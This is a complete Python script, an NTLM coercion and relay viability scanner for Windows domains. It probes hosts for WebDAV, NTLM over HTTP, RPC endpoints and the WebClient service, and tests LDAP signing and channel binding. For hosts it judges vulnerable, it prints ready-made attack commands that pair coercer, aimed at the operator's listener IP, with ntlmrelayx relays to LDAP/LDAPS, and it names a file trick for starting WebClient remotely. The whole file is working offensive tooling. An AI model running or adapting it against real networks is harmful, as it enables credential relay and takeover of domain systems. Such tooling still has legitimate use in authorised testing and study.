#!/usr/bin/env python3
"""
webdav-check.py - Full-Spectrum NTLM Coercion & Relay Viability Scanner

Goes beyond SMB-only tools (like nxc) by checking every viable coercion
and WebDAV path: HTTP OPTIONS/PROPFIND for DAV headers, RPC endpoint
probing, SMB pipe queries, NTLM challenge detection over HTTP, and
LDAP signing/channel binding for relay target assessment.

Designed to find WebDAV coercion opportunities on hosts with NO SMB,
which is the key to HTTP-based coerced auth (no MIC) relayable to
LDAP/LDAPS.

Usage:
    python3 webdav-check.py -t 10.0.0.11 -l 10.200.0.15
    python3 webdav-check.py -t 10.0.0.0/24 -l 10.200.0.15 -u user -p pass -d domain.com
    python3 webdav-check.py -t targets.txt -l 10.200.0.15 -u user -p pass -d domain.com
"""

import argparse
import socket
import ssl
import sys
import os
import ipaddress
import concurrent.futures
import http.client
import time
import base64

# ── Colours ──────────────────────────────────────────────────────────────────

if sys.platform == "win32":
    os.system("")

class C:
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    CYAN    = "\033[96m"
    GRAY    = "\033[90m"
    BOLD    = "\033[1m"
    RESET   = "\033[0m"
    MAGENTA = "\033[95m"
    WHITE   = "\033[97m"

PASS = f"{C.GREEN}[PASS]{C.RESET}"
FAIL = f"{C.GRAY}[FAIL]{C.RESET}"
WARN = f"{C.YELLOW}[WARN]{C.RESET}"
CRIT = f"{C.RED}[CRIT]{C.RESET}"
INFO = f"{C.CYAN}[INFO]{C.RESET}"
STEP = f"{C.WHITE}[STEP]{C.RESET}"

def banner():
    print(f"""
{C.CYAN}{C.BOLD}╔══════════════════════════════════════════════════════════════╗
║       Full-Spectrum NTLM Coercion & Relay Scanner            ║
║       WebDAV / RPC / SMB / HTTP / LDAP Assessment            ║
╚══════════════════════════════════════════════════════════════╝{C.RESET}
""")

# ── Target parsing ───────────────────────────────────────────────────────────

def parse_targets(target_arg):
    targets = []
    if os.path.isfile(target_arg):
        with open(target_arg) as f:
            entries = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    else:
        entries = [e.strip() for e in target_arg.split(",") if e.strip()]
    for entry in entries:
        try:
            network = ipaddress.ip_network(entry, strict=False)
            if network.num_addresses <= 65536:
                for addr in network.hosts():
                    targets.append(str(addr))
            else:
                print(f"  {WARN} Subnet {entry} too large (>65536 hosts). Skipping.")
        except ValueError:
            targets.append(entry)
    return list(dict.fromkeys(targets))


# ── Port scanning ────────────────────────────────────────────────────────────

PORTS = {
    80:   "HTTP",
    88:   "Kerberos",
    135:  "RPC/EPMAP",
    139:  "NetBIOS",
    389:  "LDAP",
    443:  "HTTPS",
    445:  "SMB",
    593:  "RPC-HTTP",
    636:  "LDAPS",
    3268: "GC",
    3269: "GC-SSL",
    5985: "WinRM-HTTP",
    5986: "WinRM-HTTPS",
    9389: "ADWS",
}

def scan_port(host, port, timeout=2):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((host, port))
        s.close()
        return port if result == 0 else None
    except (socket.error, OSError):
        return None

def scan_host_ports(host, timeout=2):
    print(f"  {STEP} Port scanning {len(PORTS)} common ports...")
    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=len(PORTS)) as ex:
        futures = {ex.submit(scan_port, host, p, timeout): p for p in PORTS}
        for f in concurrent.futures.as_completed(futures):
            r = f.result()
            if r is not None:
                open_ports.append(r)
    open_ports.sort()
    if open_ports:
        for p in open_ports:
            print(f"    {PASS} {p:>5}/tcp  {PORTS.get(p, 'Unknown')}")
    else:
        print(f"    {FAIL} No ports responded")
    return open_ports


# ── HTTP WebDAV Detection (no SMB needed) ────────────────────────────────────

def check_webdav_http(host, port=80, use_ssl=False, timeout=5):
    """
    Send HTTP OPTIONS and PROPFIND to detect WebDAV support.
    This works on hosts with NO SMB at all. If the server returns
    a DAV header or responds to PROPFIND, WebDAV is available.
    """
    scheme = "HTTPS" if use_ssl else "HTTP"
    results = {"dav_header": None, "options_methods": None, "propfind": None, "error": None}

    # OPTIONS request
    try:
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)

        print(f"    {STEP} Sending {scheme} OPTIONS to {host}:{port}...")
        conn.request("OPTIONS", "/")
        resp = conn.getresponse()
        resp.read()

        status = resp.status
        dav = resp.getheader("DAV")
        allow = resp.getheader("Allow", "")
        server = resp.getheader("Server", "unknown")
        www_auth = resp.getheader("WWW-Authenticate", "")

        print(f"      Status: {status} | Server: {server}")

        if dav:
            print(f"      {CRIT} DAV header found: {dav}")
            results["dav_header"] = dav
        else:
            print(f"      {INFO} No DAV header in OPTIONS response")

        if allow:
            print(f"      Allowed methods: {allow}")
            results["options_methods"] = allow
            dav_methods = {"PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK"}
            found_dav = dav_methods.intersection(set(allow.upper().replace(" ", "").split(",")))
            if found_dav:
                print(f"      {CRIT} WebDAV methods detected: {', '.join(found_dav)}")

        if www_auth:
            print(f"      WWW-Authenticate: {www_auth}")
            if "NTLM" in www_auth.upper():
                print(f"      {CRIT} NTLM authentication offered over {scheme}!")

        conn.close()
    except Exception as e:
        print(f"      {FAIL} OPTIONS failed: {e}")
        results["error"] = str(e)
        return results

    # PROPFIND request (the definitive WebDAV test)
    try:
        if use_ssl:
            conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)

        print(f"    {STEP} Sending {scheme} PROPFIND to {host}:{port}...")
        propfind_body = '<?xml version="1.0"?><propfind xmlns="DAV:"><prop><resourcetype/></prop></propfind>'
        conn.request("PROPFIND", "/", body=propfind_body,
                      headers={"Content-Type": "text/xml", "Depth": "0"})
        resp = conn.getresponse()
        body = resp.read()
        status = resp.status

        print(f"      Status: {status}")
        if status == 207:
            print(f"      {CRIT} 207 Multi-Status returned. WebDAV is fully active!")
            results["propfind"] = "ACTIVE"
        elif status == 401:
            www_auth = resp.getheader("WWW-Authenticate", "")
            print(f"      {WARN} 401 returned (WebDAV may be behind auth)")
            if www_auth:
                print(f"      WWW-Authenticate: {www_auth}")
            if "NTLM" in www_auth.upper():
                print(f"      {CRIT} NTLM auth required for WebDAV. Coercion relay path exists!")
                results["propfind"] = "NTLM_REQUIRED"
            else:
                results["propfind"] = "AUTH_REQUIRED"
        elif status == 405:
            print(f"      {INFO} 405 Method Not Allowed. WebDAV not enabled on this path")
            results["propfind"] = "NOT_ALLOWED"
        elif status == 403:
            print(f"      {WARN} 403 Forbidden. WebDAV may be restricted")
            results["propfind"] = "FORBIDDEN"
        else:
            print(f"      {INFO} Unexpected status {status}")
            results["propfind"] = f"HTTP_{status}"

        conn.close()
    except Exception as e:
        print(f"      {FAIL} PROPFIND failed: {e}")

    return results


def check_http_ntlm_challenge(host, port=80, use_ssl=False, timeout=5):
    """
    Send an unauthenticated HTTP request to see if the server
    challenges with NTLM. This indicates HTTP NTLM relay potential.
    """
    scheme = "HTTPS" if use_ssl else "HTTP"
    try:
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)

        print(f"    {STEP} Checking {scheme} NTLM challenge on {host}:{port}...")
        conn.request("GET", "/")
        resp = conn.getresponse()
        resp.read()

        www_auth = resp.getheader("WWW-Authenticate", "")
        status = resp.status
        print(f"      Status: {status}")

        if www_auth:
            print(f"      WWW-Authenticate: {www_auth}")
            if "NTLM" in www_auth.upper():
                print(f"      {CRIT} Server challenges with NTLM over {scheme}!")
                conn.close()
                return "NTLM"
            elif "NEGOTIATE" in www_auth.upper():
                print(f"      {WARN} Server offers Negotiate (may accept NTLM)")
                conn.close()
                return "NEGOTIATE"
            else:
                conn.close()
                return www_auth
        else:
            if status == 200:
                print(f"      {INFO} No auth required (200 OK, no challenge)")
            else:
                print(f"      {INFO} No WWW-Authenticate header in response")
            conn.close()
            return None
    except Exception as e:
        print(f"      {FAIL} {scheme} challenge check failed: {e}")
        return None


# ── RPC Endpoint Mapper check ────────────────────────────────────────────────

def check_rpc_endpoints(host, timeout=5):
    """
    Connect to RPC Endpoint Mapper (135) and verify it responds.
    If port 135 is open, RPC coercion (MS-EFSR, MS-RPRN, etc.)
    can be attempted regardless of SMB status.
    """
    print(f"    {STEP} Probing RPC Endpoint Mapper on {host}:135...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, 135))
        # DCE/RPC bind to EPM (endpoint mapper) UUID
        # This is a minimal RPC bind packet
        rpc_bind = bytearray([
            0x05, 0x00,  # version 5.0
            0x0b,        # bind
            0x03,        # flags (first+last frag)
            0x10, 0x00, 0x00, 0x00,  # data representation
            0x48, 0x00,  # frag length
            0x00, 0x00,  # auth length
            0x01, 0x00, 0x00, 0x00,  # call id
            0xb8, 0x10,  # max xmit frag
            0xb8, 0x10,  # max recv frag
            0x00, 0x00, 0x00, 0x00,  # assoc group
            0x01,        # num ctx items
            0x00, 0x00, 0x00,  # padding
            0x00, 0x00,  # context id
            0x01, 0x00,  # num transfer syntaxes
            # EPM interface UUID: e1af8308-5d1f-11c9-91a4-08002b14a0fa
            0x08, 0x83, 0xaf, 0xe1,
            0x1f, 0x5d,
            0xc9, 0x11,
            0x91, 0xa4,
            0x08, 0x00, 0x2b, 0x14, 0xa0, 0xfa,
            0x03, 0x00, 0x00, 0x00,  # version 3.0
            # Transfer syntax NDR
            0x04, 0x5d, 0x88, 0x8a,
            0xeb, 0x1c,
            0xc9, 0x11,
            0x9f, 0xe8,
            0x08, 0x00, 0x2b, 0x10, 0x48, 0x60,
            0x02, 0x00, 0x00, 0x00,  # version 2.0
        ])
        s.send(rpc_bind)
        resp = s.recv(4096)
        s.close()
        if len(resp) > 2 and resp[2] == 0x0c:  # bind_ack
            print(f"      {PASS} RPC Endpoint Mapper responded with bind_ack")
            print(f"      {WARN} RPC coercion (MS-EFSR, MS-RPRN, MS-DFSNM) possible even without SMB")
            return True
        else:
            print(f"      {INFO} RPC responded but unexpected packet type: 0x{resp[2]:02x}")
            return True
    except socket.timeout:
        print(f"      {FAIL} RPC connection timed out")
        return False
    except ConnectionRefusedError:
        print(f"      {FAIL} RPC connection refused")
        return False
    except Exception as e:
        print(f"      {FAIL} RPC probe error: {e}")
        return False


# ── SMB WebClient pipe check (bonus, only when SMB is available) ─────────────

def check_webclient_smb_auth(host, domain, username, password):
    """
    Authenticated check of WebClient service state via SVCCTL over SMB.
    This is a BONUS check when SMB is available, not the primary method.
    """
    print(f"    {STEP} Querying WebClient service via SMB/SVCCTL (authenticated)...")
    try:
        from impacket.smbconnection import SMBConnection
        from impacket.dcerpc.v5 import transport, scmr

        smb = SMBConnection(host, host, timeout=5)
        smb.login(username, password, domain)
        print(f"      {PASS} SMB authentication successful")

        rpc = transport.SMBTransport(host, filename=r"\svcctl", smb_connection=smb)
        dce = rpc.get_dce_rpc()
        dce.connect()
        dce.bind(scmr.MSRPC_UUID_SCMR)

        scm = scmr.hROpenSCManagerW(dce)["lpScHandle"]
        try:
            svc = scmr.hROpenServiceW(dce, scm, "WebClient")["lpServiceHandle"]
            status = scmr.hRQueryServiceStatus(dce, svc)
            state = status["lpServiceStatus"]["dwCurrentState"]
            start_type = status["lpServiceStatus"]["dwServiceType"]
            scmr.hRCloseServiceHandle(dce, svc)

            states = {1: "STOPPED", 2: "START_PENDING", 3: "STOP_PENDING",
                      4: "RUNNING", 5: "CONTINUE_PENDING", 6: "PAUSE_PENDING", 7: "PAUSED"}
            state_str = states.get(state, f"UNKNOWN({state})")

            if state == 4:
                print(f"      {CRIT} WebClient service is RUNNING")
            elif state == 1:
                print(f"      {WARN} WebClient service is STOPPED (can potentially be started remotely)")
            else:
                print(f"      {INFO} WebClient service state: {state_str}")

            scmr.hRCloseServiceHandle(dce, scm)
            dce.disconnect()
            smb.close()
            return state_str
        except Exception as e:
            scmr.hRCloseServiceHandle(dce, scm)
            dce.disconnect()
            smb.close()
            if "ERROR_SERVICE_DOES_NOT_EXIST" in str(e) or "0x424" in str(e):
                print(f"      {INFO} WebClient service not installed")
                return "NOT_INSTALLED"
            print(f"      {FAIL} Service query failed: {e}")
            return "QUERY_FAILED"
    except ImportError:
        print(f"      {FAIL} impacket not available. Skipping SMB-based WebClient check")
        return "NO_IMPACKET"
    except Exception as e:
        err = str(e).lower()
        if "logon_failure" in err or "access_denied" in err:
            print(f"      {FAIL} Authentication failed for SMB service query")
            return "AUTH_FAILED"
        print(f"      {FAIL} SMB service query error: {e}")
        return f"ERROR"


# ── LDAP Signing & Channel Binding ───────────────────────────────────────────

def check_ldap_relay_viability(host, domain, username, password):
    """Check LDAP signing and channel binding to assess relay targets."""
    result = {"signing": "UNKNOWN", "channel_binding": "UNKNOWN"}

    try:
        import ldap3
    except ImportError:
        print(f"    {FAIL} ldap3 not available. Cannot check LDAP signing/channel binding")
        result["signing"] = "NO_LDAP3"
        result["channel_binding"] = "NO_LDAP3"
        return result

    # LDAP signing (port 389)
    print(f"    {STEP} Testing LDAP signing enforcement on {host}:389...")
    try:
        server = ldap3.Server(host, port=389, get_info=ldap3.ALL, connect_timeout=5)
        conn = ldap3.Connection(
            server, user=f"{domain}\\{username}", password=password,
            authentication=ldap3.NTLM, auto_bind=True
        )
        conn.unbind()
        print(f"      {CRIT} LDAP signing is NOT required. Relay to LDAP viable!")
        result["signing"] = "NOT_REQUIRED"
    except Exception as e:
        estr = str(e)
        if "strongerAuthRequired" in estr or "StrongerAuthRequired" in estr:
            print(f"      {PASS} LDAP signing is REQUIRED (relay to plain LDAP blocked)")
            result["signing"] = "REQUIRED"
        else:
            print(f"      {FAIL} LDAP bind error: {e}")
            result["signing"] = "ERROR"

    # Channel binding (port 636)
    print(f"    {STEP} Testing LDAPS channel binding on {host}:636...")
    try:
        tls = ldap3.Tls(validate=0)
        server = ldap3.Server(host, port=636, use_ssl=True, tls=tls,
                              get_info=ldap3.ALL, connect_timeout=5)
        conn = ldap3.Connection(
            server, user=f"{domain}\\{username}", password=password,
            authentication=ldap3.NTLM, auto_bind=True
        )
        conn.unbind()
        print(f"      {CRIT} Channel binding NOT required. Relay to LDAPS viable!")
        result["channel_binding"] = "NOT_REQUIRED"
    except Exception as e:
        estr = str(e)
        if "80090346" in estr:
            print(f"      {PASS} Channel binding is REQUIRED (relay to LDAPS blocked)")
            result["channel_binding"] = "REQUIRED"
        elif "strongerAuthRequired" in estr:
            print(f"      {WARN} Stronger auth required on LDAPS")
            result["channel_binding"] = "STRONGER_AUTH"
        else:
            print(f"      {FAIL} LDAPS bind error: {e}")
            result["channel_binding"] = "ERROR"

    return result


# ── Per-host full analysis ───────────────────────────────────────────────────

def analyse_host(host, listener_ip, args):
    has_creds = all([args.username, args.password, args.domain != "."])

    print(f"\n{C.CYAN}{C.BOLD}{'='*64}")
    print(f"  TARGET: {host}")
    print(f"{'='*64}{C.RESET}\n")

    # ── Phase 1: Port scan ───────────────────────────────────────────────
    print(f"  {C.BOLD}Phase 1: Port Discovery{C.RESET}")
    open_ports = scan_host_ports(host, args.timeout)
    if not open_ports:
        print(f"\n  {FAIL} No open ports. Host is unreachable or fully filtered.")
        return {"host": host, "coercion": False, "webdav": False, "critical": False}

    has_rpc   = 135 in open_ports
    has_smb   = 445 in open_ports
    has_http  = 80 in open_ports
    has_https = 443 in open_ports
    has_ldap  = 389 in open_ports
    has_ldaps = 636 in open_ports
    is_dc     = 88 in open_ports and has_ldap

    if is_dc:
        print(f"\n  {C.MAGENTA}{C.BOLD}  Likely Domain Controller (Kerberos + LDAP detected){C.RESET}")

    # ── Phase 2: WebDAV detection (HTTP-based, NO SMB needed) ────────────
    print(f"\n  {C.BOLD}Phase 2: WebDAV Detection (HTTP-based, independent of SMB){C.RESET}")

    webdav_found = False
    ntlm_over_http = False

    if has_http:
        print(f"\n  {INFO} Checking HTTP (port 80)...")
        dav_result = check_webdav_http(host, port=80, use_ssl=False, timeout=args.timeout)
        if dav_result["dav_header"] or dav_result.get("propfind") in ("ACTIVE", "NTLM_REQUIRED"):
            webdav_found = True
        challenge = check_http_ntlm_challenge(host, port=80, use_ssl=False, timeout=args.timeout)
        if challenge in ("NTLM", "NEGOTIATE"):
            ntlm_over_http = True
    else:
        print(f"    {FAIL} Port 80 closed. No HTTP WebDAV possible on standard port")

    if has_https:
        print(f"\n  {INFO} Checking HTTPS (port 443)...")
        dav_result_s = check_webdav_http(host, port=443, use_ssl=True, timeout=args.timeout)
        if dav_result_s["dav_header"] or dav_result_s.get("propfind") in ("ACTIVE", "NTLM_REQUIRED"):
            webdav_found = True
        challenge_s = check_http_ntlm_challenge(host, port=443, use_ssl=True, timeout=args.timeout)
        if challenge_s in ("NTLM", "NEGOTIATE"):
            ntlm_over_http = True

    if 5985 in open_ports:
        print(f"\n  {INFO} Checking WinRM HTTP (port 5985)...")
        challenge_w = check_http_ntlm_challenge(host, port=5985, use_ssl=False, timeout=args.timeout)
        if challenge_w in ("NTLM", "NEGOTIATE"):
            ntlm_over_http = True
            print(f"      {WARN} WinRM offers NTLM. Potential relay path via HTTP")

    if not has_http and not has_https:
        print(f"    {INFO} No HTTP/HTTPS ports open. WebDAV not reachable over HTTP")

    # ── Phase 3: RPC coercion viability ──────────────────────────────────
    print(f"\n  {C.BOLD}Phase 3: RPC Coercion Viability{C.RESET}")

    rpc_viable = False
    if has_rpc:
        rpc_viable = check_rpc_endpoints(host, timeout=args.timeout)
    else:
        print(f"    {FAIL} Port 135 closed. Direct RPC coercion not possible")

    if has_smb and not has_rpc:
        print(f"    {WARN} SMB (445) open without RPC (135). Named pipe coercion may still work")
        rpc_viable = True

    # ── Phase 4: SMB WebClient service check (bonus, when SMB available) ─
    print(f"\n  {C.BOLD}Phase 4: SMB-based WebClient Service Query (bonus check){C.RESET}")

    webclient_state = "UNCHECKED"
    if has_smb:
        if has_creds:
            webclient_state = check_webclient_smb_auth(host, args.domain, args.username, args.password)
        else:
            print(f"    {INFO} SMB is open but no credentials provided. Cannot query service state")
            print(f"    {INFO} Provide -u/-p/-d for authenticated WebClient service check")
            webclient_state = "NO_CREDS"
    else:
        print(f"    {INFO} SMB (445) closed. Skipping SMB-based check (HTTP checks above are primary)")

    # ── Phase 5: LDAP relay target assessment ────────────────────────────
    print(f"\n  {C.BOLD}Phase 5: LDAP Relay Target Assessment{C.RESET}")

    ldap_info = None
    if (has_ldap or has_ldaps) and has_creds:
        ldap_info = check_ldap_relay_viability(host, args.domain, args.username, args.password)
    elif has_ldap or has_ldaps:
        print(f"    {INFO} LDAP/LDAPS ports open but no credentials. Cannot test signing/binding")
        print(f"    {INFO} Provide -u/-p/-d to check LDAP signing and channel binding")
    else:
        print(f"    {INFO} No LDAP/LDAPS ports open on this host")

    # ── Phase 6: Verdict ─────────────────────────────────────────────────
    print(f"\n  {C.BOLD}Phase 6: Coercion & Relay Verdict{C.RESET}\n")

    coercion_possible = rpc_viable or has_smb
    webdav_coercion = (
        webdav_found or
        webclient_state == "RUNNING" or
        ntlm_over_http
    )
    webclient_startable = webclient_state == "STOPPED"

    ldap_relay_open = (
        ldap_info and
        (ldap_info.get("signing") == "NOT_REQUIRED" or
         ldap_info.get("channel_binding") == "NOT_REQUIRED")
    )
    critical = webdav_coercion and ldap_relay_open

    # Coercion paths
    if coercion_possible:
        print(f"    {WARN} Standard coercion: YES (RPC/SMB reachable)")
        print(f"         Coercer can attempt MS-EFSR, MS-RPRN, MS-DFSNM against this host")
    else:
        print(f"    {FAIL} Standard coercion: NO (no RPC or SMB)")

    # WebDAV verdict
    if webclient_state == "RUNNING":
        print(f"    {CRIT} WebClient service: RUNNING (confirmed via SMB)")
        print(f"         WebDAV coercion will send auth over HTTP (no MIC enforcement)")
    elif webdav_found:
        print(f"    {CRIT} WebDAV: DETECTED via HTTP probe (DAV headers or PROPFIND response)")
        print(f"         This host accepts WebDAV requests, coerced auth goes over HTTP (no MIC)")
    elif ntlm_over_http:
        print(f"    {CRIT} NTLM over HTTP: Server challenges with NTLM on HTTP")
        print(f"         HTTP-based NTLM relay possible if coercion triggers HTTP callback")
    elif webclient_startable:
        print(f"    {WARN} WebClient service: STOPPED but installed")
        print(f"         Can be started remotely via .searchConnector-ms or .library-ms file")
        print(f"         If started, WebDAV coercion becomes viable")
    else:
        print(f"    {INFO} WebDAV coercion: Not detected via HTTP. WebClient not confirmed running")
        if not has_smb:
            print(f"         (SMB closed, so service state could not be checked directly)")

    # LDAP relay
    if ldap_info:
        signing = ldap_info.get("signing", "UNKNOWN")
        cb = ldap_info.get("channel_binding", "UNKNOWN")
        if signing == "NOT_REQUIRED":
            print(f"    {CRIT} LDAP signing: NOT REQUIRED (relay to ldap://{host} viable)")
        elif signing == "REQUIRED":
            print(f"    {PASS} LDAP signing: REQUIRED (plain LDAP relay blocked)")
        if cb == "NOT_REQUIRED":
            print(f"    {CRIT} Channel binding: NOT REQUIRED (relay to ldaps://{host} viable)")
        elif cb == "REQUIRED":
            print(f"    {PASS} Channel binding: REQUIRED (LDAPS relay blocked)")

    # Full chain
    if critical:
        print(f"\n    {C.RED}{C.BOLD}{'*'*52}")
        print(f"    *  CRITICAL: Full attack chain identified!       *")
        print(f"    *  WebDAV coercion (no MIC) -> LDAP/LDAPS relay  *")
        print(f"    {'*'*52}{C.RESET}")
        if ldap_info.get("signing") == "NOT_REQUIRED":
            print(f"\n    {C.RED}Attack: ntlmrelayx.py -t ldap://{host} --http-port 80")
            print(f"           coercer scan -t {host} -l {listener_ip}@80/coerce{C.RESET}")
        if ldap_info.get("channel_binding") == "NOT_REQUIRED":
            print(f"\n    {C.RED}Attack: ntlmrelayx.py -t ldaps://{host} --http-port 80")
            print(f"           coercer scan -t {host} -l {listener_ip}@80/coerce{C.RESET}")

    elif webdav_coercion and not ldap_relay_open and (has_ldap or has_ldaps):
        print(f"\n    {WARN} WebDAV coercion possible but LDAP relay targets are hardened")
        print(f"         Look for other relay targets on the network (SMB signing disabled, etc.)")

    elif coercion_possible:
        print(f"\n    {INFO} Standard coercion possible (SMB-based, MIC enforced)")
        print(f"         SMB coerced auth cannot relay to LDAP (MIC blocks it)")
        print(f"         Relay to SMB targets with signing disabled, or try to start WebClient")

    # Commands
    if coercion_possible or webdav_coercion:
        print(f"\n  {C.BOLD}Recommended Commands:{C.RESET}")
        if coercion_possible:
            print(f"    {C.WHITE}SMB coercion:    coercer scan -t {host} -l {listener_ip}{C.RESET}")
        if webdav_coercion or webclient_startable:
            print(f"    {C.WHITE}WebDAV coercion: coercer scan -t {host} -l {listener_ip}@80/coerce{C.RESET}")
        if has_ldap and ldap_info and ldap_info.get("signing") == "NOT_REQUIRED":
            print(f"    {C.WHITE}LDAP relay:      ntlmrelayx.py -t ldap://{host} --http-port 80{C.RESET}")
        if has_ldaps and ldap_info and ldap_info.get("channel_binding") == "NOT_REQUIRED":
            print(f"    {C.WHITE}LDAPS relay:     ntlmrelayx.py -t ldaps://{host} --http-port 80{C.RESET}")

    return {
        "host": host,
        "coercion": coercion_possible,
        "webdav": webdav_coercion,
        "webclient_startable": webclient_startable,
        "ntlm_http": ntlm_over_http,
        "ldap_relay": ldap_relay_open,
        "critical": critical,
        "is_dc": is_dc,
    }


# ── Main ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Full-Spectrum NTLM Coercion & Relay Viability Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 webdav-check.py -t 10.0.0.11 -l 10.200.0.15
  python3 webdav-check.py -t 10.0.0.0/24 -l 10.200.0.15 -u russ -p 'Pass123' -d corp.com
  python3 webdav-check.py -t targets.txt -l 10.200.0.15 -u russ -p 'Pass123' -d corp.com
  python3 webdav-check.py -t 10.0.0.11,10.0.0.19,10.0.0.60 -l 10.200.0.15
        """,
    )
    parser.add_argument("-t", "--targets", required=True,
                        help="IP, CIDR, comma-separated list, or file (one target per line)")
    parser.add_argument("-l", "--listener", required=True,
                        help="Your listener IP (where coerced auth callbacks go)")
    parser.add_argument("-u", "--username", default=None, help="Domain username")
    parser.add_argument("-p", "--password", default=None, help="Password")
    parser.add_argument("-d", "--domain", default=".", help="Domain (default: .)")
    parser.add_argument("--timeout", type=int, default=3, help="Connection timeout seconds (default: 3)")

    args = parser.parse_args()
    has_creds = all([args.username, args.password, args.domain != "."])

    banner()

    targets = parse_targets(args.targets)
    if not targets:
        print(f"  {C.RED}[!] No valid targets.{C.RESET}")
        sys.exit(1)

    print(f"  {C.WHITE}Targets:     {len(targets)} host(s){C.RESET}")
    print(f"  {C.WHITE}Listener:    {args.listener}{C.RESET}")
    print(f"  {C.WHITE}Credentials: {'Yes (' + args.domain + chr(92) + args.username + ')' if has_creds else 'None (HTTP/RPC checks only)'}{C.RESET}")
    print(f"  {C.WHITE}Timeout:     {args.timeout}s{C.RESET}")

    # Dependency check
    deps = {}
    for mod in ("impacket", "ldap3"):
        try:
            __import__(mod)
            deps[mod] = True
        except ImportError:
            deps[mod] = False

    print(f"\n  {C.BOLD}Dependencies:{C.RESET}")
    print(f"    impacket: {PASS + ' available' if deps['impacket'] else WARN + ' not found (SMB service query unavailable)'}")
    print(f"    ldap3:    {PASS + ' available' if deps['ldap3'] else WARN + ' not found (LDAP signing/CB check unavailable)'}")
    print(f"\n  {C.GRAY}Note: HTTP-based WebDAV detection requires NO dependencies.{C.RESET}")
    print(f"  {C.GRAY}This scanner works without impacket/ldap3, just with reduced checks.{C.RESET}")

    results = []
    for i, host in enumerate(targets):
        print(f"\n{C.CYAN}{'─'*64}")
        print(f"  [{i+1}/{len(targets)}] Starting full-spectrum scan of {host}")
        print(f"{'─'*64}{C.RESET}")
        r = analyse_host(host, args.listener, args)
        results.append(r)

    # ── Summary ──────────────────────────────────────────────────────────

    print(f"\n\n{C.CYAN}{C.BOLD}{'═'*64}")
    print(f"  FINAL SUMMARY")
    print(f"{'═'*64}{C.RESET}\n")

    total = len(results)
    coercible = [r for r in results if r["coercion"]]
    webdav_hosts = [r for r in results if r.get("webdav")]
    startable = [r for r in results if r.get("webclient_startable")]
    ntlm_http = [r for r in results if r.get("ntlm_http")]
    ldap_targets = [r for r in results if r.get("ldap_relay")]
    criticals = [r for r in results if r["critical"]]
    dcs = [r for r in results if r.get("is_dc")]

    print(f"  Hosts scanned:              {total}")
    print(f"  Domain Controllers:         {len(dcs)}")
    print(f"  Coercion candidates:        {len(coercible)}")
    print(f"  WebDAV coercion viable:     {len(webdav_hosts)}")
    print(f"  WebClient startable:        {len(startable)}")
    print(f"  NTLM over HTTP:             {len(ntlm_http)}")
    print(f"  LDAP relay targets:         {len(ldap_targets)}")

    if criticals:
        print(f"\n  {C.RED}{C.BOLD}CRITICAL CHAINS ({len(criticals)}):{C.RESET}")
        for r in criticals:
            print(f"    {CRIT} {r['host']} - WebDAV coercion (no MIC) -> LDAP/LDAPS relay")

    if webdav_hosts and not criticals:
        print(f"\n  {C.YELLOW}WebDAV coercion possible (look for relay targets):{C.RESET}")
        for r in webdav_hosts:
            print(f"    {WARN} {r['host']}")

    if startable:
        print(f"\n  {C.YELLOW}WebClient stopped but startable:{C.RESET}")
        for r in startable:
            print(f"    {WARN} {r['host']} (start via .searchConnector-ms trick)")

    if ntlm_http:
        print(f"\n  {C.YELLOW}NTLM challenges over HTTP:{C.RESET}")
        for r in ntlm_http:
            print(f"    {WARN} {r['host']}")

    if coercible and not webdav_hosts and not criticals:
        print(f"\n  {C.GRAY}Coercion candidates (SMB only, MIC enforced):{C.RESET}")
        for r in coercible:
            print(f"    {INFO} {r['host']}")

    if not coercible and not webdav_hosts:
        print(f"\n  {C.GRAY}No coercion candidates found from this position{C.RESET}")

    print(f"\n{C.CYAN}{'═'*64}{C.RESET}\n")


if __name__ == "__main__":
    main()
